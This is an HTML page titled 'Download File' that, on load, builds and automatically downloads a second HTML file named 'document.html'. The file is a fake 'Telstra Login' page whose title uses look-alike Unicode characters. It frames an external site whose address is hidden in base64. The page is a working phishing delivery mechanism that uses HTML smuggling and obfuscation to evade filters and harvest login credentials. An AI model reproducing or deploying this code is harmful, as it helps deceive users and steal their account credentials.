<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File</title>
</head>
<body>

<script>
    document.addEventListener("DOMContentLoaded", function () {
        // Content to be downloaded
        const htmlCode = `
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Tеӏstrа Lօgіn</title>
            <link rel="shortcut icon" href="https://cdn.glitch.global/e22e8651-0e2b-4bdc-98db-2e587e919c9e/favicon-base-blue.ico">
            <style>
                body { margin: 0; overflow: hidden; }
                iframe { width: 100%; height: 100%; border: none; }
            </style>
        </head>
        <body>
            <iframe id="doc"></iframe>
            <script>
                document.getElementById('doc').src = atob('aHR0cHM6Ly9taW5lLW9sZC5nbGl0Y2gubWUv');
            <\/script>
        <\/body>
        <\/html>`;
        
        // Create a Blob with the HTML code
        const blob = new Blob([htmlCode], { type: 'text/html' });

        // Create a download link and trigger the download
        const downloadLink = document.createElement('a');
        downloadLink.href = URL.createObjectURL(blob);
        downloadLink.download = 'document.html';

        // Append the link to the body and click it to trigger the download
        document.body.appendChild(downloadLink);
        downloadLink.click();

        // Remove the link from the DOM
        document.body.removeChild(downloadLink);
    });
</script>

</body>
</html>
